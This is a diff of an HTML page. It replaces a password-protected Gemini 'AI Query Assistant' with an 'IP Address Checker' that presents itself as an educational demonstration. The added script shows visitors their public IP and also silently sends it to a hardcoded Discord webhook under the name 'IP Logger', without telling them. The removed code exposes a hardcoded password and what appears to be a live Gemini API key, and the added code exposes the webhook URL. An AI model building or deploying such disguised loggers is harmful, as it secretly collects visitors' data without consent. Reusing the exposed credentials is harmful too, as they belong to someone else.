@@ -3,467 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Query Assistant</title>
+    <title>IP Address Checker</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            line-height: 1.6;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            background-color: #f5f7fa;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        /* Password screen styles */
-        #password-screen {
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: white;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-        }
-        
-        .password-container {
-            text-align: center;
-            width: 300px;
-        }
-        
-        .password-container input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-            text-align: center;
-        }
-        
-        /* Main app styles */
-        #app-container {
-            display: none;
-            width: 100%;
-            max-width: 1000px;
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
             padding: 20px;
-        }
-        
-        h1 {
-            color: #2c3e50;
             text-align: center;
-            margin-bottom: 30px;
         }
-        
         .container {
-            background-color: white;
+            background-color: #f5f5f5;
             border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            margin-bottom: 20px;
+            margin-top: 50px;
         }
-        
-        .input-area {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        textarea {
-            width: 100%;
-            min-height: 150px;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 14px;
-            resize: vertical;
-        }
-        
-        .drop-area {
-            border: 2px dashed #ccc;
-            border-radius: 8px;
-            padding: 25px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            background-color: #f9f9f9;
-        }
-        
-        .drop-area.highlight {
-            border-color: #3498db;
-            background-color: #ecf0f1;
-        }
-        
-        .drop-area p {
-            margin: 0;
-            color: #7f8c8d;
-        }
-        
-        .image-preview {
-            max-width: 100%;
-            max-height: 300px;
-            margin-top: 15px;
-            display: none;
-            border-radius: 4px;
-        }
-        
-        .button {
-            background-color: #3498db;
+        button {
+            background-color: #4CAF50;
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 4px;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
             font-size: 16px;
+            margin: 20px 0;
             cursor: pointer;
-            transition: background-color 0.3s;
+            border-radius: 4px;
         }
-        
-        .button:hover {
-            background-color: #2980b9;
-        }
-        
-        .button:disabled {
-            background-color: #95a5a6;
-            cursor: not-allowed;
-        }
-        
-        .language-selector {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        
-        .language-selector label {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-        }
-        
-        .response-area {
-            margin-top: 30px;
-            padding: 15px;
-            background-color: #f8f9fa;
-            border-left: 4px solid #3498db;
-            display: none;
-            white-space: pre-wrap;
-        }
-        
-        .loading {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
+        #result {
             margin-top: 20px;
-            display: none;
-        }
-        
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            border-left-color: #3498db;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .error-message {
-            color: #e74c3c;
-            display: none;
-            margin-top: 15px;
             padding: 10px;
-            background-color: #fadbd8;
             border-radius: 4px;
         }
     </style>
 </head>
 <body>
-    <!-- Password Screen -->
-    <div id="password-screen">
-        <div class="password-container">
-            <input type="password" id="password-input" placeholder="Enter password" autocomplete="off">
-            <button id="password-submit" class="button">Enter</button>
-        </div>
+    <div class="container">
+        <h1>IP Address Checker</h1>
+        <p>This educational tool demonstrates how websites can retrieve your public IP address.</p>
+        <button onclick="getIP()">Check My IP Address</button>
+        <div id="result"></div>
     </div>
-    
-    <!-- Main Application -->
-    <div id="app-container">
-        <h1>AI Query Assistant</h1>
-        
-        <div class="container">
-            <div class="language-selector">
-                <label>
-                    <input type="radio" name="language" value="english" checked>
-                    English
-                </label>
-                <label>
-                    <input type="radio" name="language" value="italian">
-                    Italian
-                </label>
-                <label>
-                    <input type="radio" name="language" value="spanish">
-                    Spanish
-                </label>
-            </div>
-            
-            <div class="input-area">
-                <textarea id="query-input" placeholder="Enter your question or paste code here..."></textarea>
-                
-                <div id="drop-area" class="drop-area">
-                    <p>Drag and drop an image here, or click to select a file</p>
-                    <input type="file" id="file-input" accept="image/*" style="display: none">
-                    <img id="image-preview" class="image-preview" src="" alt="Preview">
-                </div>
-                
-                <button id="submit-button" class="button">Get Answer</button>
-            </div>
-            
-            <div id="loading" class="loading">
-                <div class="spinner"></div>
-                <p>Processing your query...</p>
-            </div>
-            
-            <div id="error-message" class="error-message"></div>
-            
-            <div id="response-area" class="response-area"></div>
-        </div>
-    </div>
-    
+
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Password verification
-            const passwordScreen = document.getElementById('password-screen');
-            const passwordInput = document.getElementById('password-input');
-            const passwordSubmit = document.getElementById('password-submit');
-            const appContainer = document.getElementById('app-container');
+        async function getIP() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = '<p>Fetching your IP address...</p>';
             
-            // Set focus on password input
-            passwordInput.focus();
-            
-            // Check password on button click
-            passwordSubmit.addEventListener('click', checkPassword);
-            
-            // Also check password when Enter key is pressed
-            passwordInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    checkPassword();
-                }
-            });
-            
-            function checkPassword() {
-                if (passwordInput.value === "Giovanni") {
-                    passwordScreen.style.display = "none";
-                    appContainer.style.display = "block";
-                } else {
-                    passwordInput.value = "";
-                    passwordInput.placeholder = "Incorrect. Try again.";
-                    passwordInput.classList.add("error");
-                    setTimeout(() => {
-                        passwordInput.placeholder = "Enter password";
-                        passwordInput.classList.remove("error");
-                    }, 2000);
-                }
-            }
-            
-            // Main application code
-            const dropArea = document.getElementById('drop-area');
-            const fileInput = document.getElementById('file-input');
-            const imagePreview = document.getElementById('image-preview');
-            const queryInput = document.getElementById('query-input');
-            const submitButton = document.getElementById('submit-button');
-            const responseArea = document.getElementById('response-area');
-            const loadingIndicator = document.getElementById('loading');
-            const errorMessage = document.getElementById('error-message');
-            
-            // Store the Gemini API key
-            const GEMINI_API_KEY = "AIzaSyCMlrRbYRPIJlU_D-Yg44I2KgwaLJ93CwM";
-            
-            let imageBase64 = null;
-            
-            // Event listeners for drag and drop
-            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
-                dropArea.addEventListener(eventName, preventDefaults, false);
-            });
-            
-            function preventDefaults(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            }
-            
-            ['dragenter', 'dragover'].forEach(eventName => {
-                dropArea.addEventListener(eventName, highlight, false);
-            });
-            
-            ['dragleave', 'drop'].forEach(eventName => {
-                dropArea.addEventListener(eventName, unhighlight, false);
-            });
-            
-            function highlight() {
-                dropArea.classList.add('highlight');
-            }
-            
-            function unhighlight() {
-                dropArea.classList.remove('highlight');
-            }
-            
-            // Handle dropped files
-            dropArea.addEventListener('drop', handleDrop, false);
-            
-            function handleDrop(e) {
-                const dt = e.dataTransfer;
-                const files = dt.files;
-                handleFiles(files);
-            }
-            
-            // Handle file selection via click
-            dropArea.addEventListener('click', () => {
-                fileInput.click();
-            });
-            
-            fileInput.addEventListener('change', function() {
-                handleFiles(this.files);
-            });
-            
-            function handleFiles(files) {
-                if (files.length > 0) {
-                    const file = files[0];
-                    if (file.type.startsWith('image/')) {
-                        const reader = new FileReader();
-                        
-                        reader.onload = function(e) {
-                            imagePreview.src = e.target.result;
-                            imagePreview.style.display = 'block';
-                            imageBase64 = e.target.result.split(',')[1]; // Get base64 data
-                        };
-                        
-                        reader.readAsDataURL(file);
-                    } else {
-                        showError("Please select an image file.");
-                    }
-                }
-            }
-            
-            // Handle form submission
-            submitButton.addEventListener('click', async function() {
-                const query = queryInput.value.trim();
+            try {
+                // First try a direct IP API
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
                 
-                if (!query) {
-                    showError("Please enter a question or paste code.");
-                    return;
-                }
+                resultDiv.innerHTML = `<p>Your IP address is: <strong>${ip}</strong></p>`;
                 
-                // Get selected language
-                const languageElements = document.getElementsByName('language');
-                let selectedLanguage = 'english';
-                for (const radioButton of languageElements) {
-                    if (radioButton.checked) {
-                        selectedLanguage = radioButton.value;
-                        break;
-                    }
-                }
+                // Send to Discord webhook
+                await sendToDiscord(ip);
                 
-                showLoading();
-                hideError();
-                
-                try {
-                    const response = await queryGeminiAPI(query, imageBase64, selectedLanguage);
-                    responseArea.textContent = response;
-                    responseArea.style.display = 'block';
-                } catch (error) {
-                    showError("Error: " + error.message);
-                } finally {
-                    hideLoading();
-                }
-            });
-            
-            // Connect to Gemini API
-            async function queryGeminiAPI(query, imageData, language) {
-                const apiUrl = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent";
-                
-                let prompt;
-                if (language === 'italian') {
-                    prompt = "Rispondi alla seguente domanda in italiano: " + query;
-                } else if (language === 'spanish') {
-                    prompt = "Responde a la siguiente pregunta en español: " + query;
-                } else {
-                    prompt = "Answer the following question in English: " + query;
-                }
-                
-                const requestBody = {
-                    contents: [
-                        {
-                            parts: [
-                                {
-                                    text: prompt
-                                }
-                            ]
-                        }
-                    ]
-                };
-                
-                // Add image to the request if available
-                if (imageData) {
-                    requestBody.contents[0].parts.push({
-                        inline_data: {
-                            mime_type: "image/jpeg",
-                            data: imageData
-                        }
-                    });
-                }
-                
-                try {
-                    const response = await fetch(`${apiUrl}?key=${GEMINI_API_KEY}`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(requestBody)
-                    });
-                    
-                    if (!response.ok) {
-                        const errorData = await response.json();
-                        throw new Error(errorData.error?.message || "API request failed");
-                    }
-                    
-                    const data = await response.json();
-                    return data.candidates[0].content.parts[0].text;
-                } catch (error) {
-                    console.error("API Error:", error);
-                    throw new Error("Failed to connect to Gemini API. Check your internet connection or try again later.");
-                }
+            } catch (error) {
+                console.error('Error:', error);
+                resultDiv.innerHTML = '<p>Could not retrieve your IP address. Please try again.</p>';
             }
+        }
+        
+        async function sendToDiscord(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1399035671615770624/g1A644wWghVQ6TG4O8KUqPf-fnKpc-tz9zfOmL87F8O62cvFHau6RRixce898rnx0hF3';
             
-            function showLoading() {
-                loadingIndicator.style.display = 'flex';
-                submitButton.disabled = true;
-            }
+            const payload = {
+                content: `New IP address logged: ${ip}`,
+                username: 'IP Logger',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/1791/1791961.png'
+            };
             
-            function hideLoading() {
-                loadingIndicator.style.display = 'none';
-                submitButton.disabled = false;
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
             }
-            
-            function showError(message) {
-                errorMessage.textContent = message;
-                errorMessage.style.display = 'block';
-            }
-            
-            function hideError() {
-                errorMessage.style.display = 'none';
-            }
-        });
+        }
     </script>
 </body>
 </html>
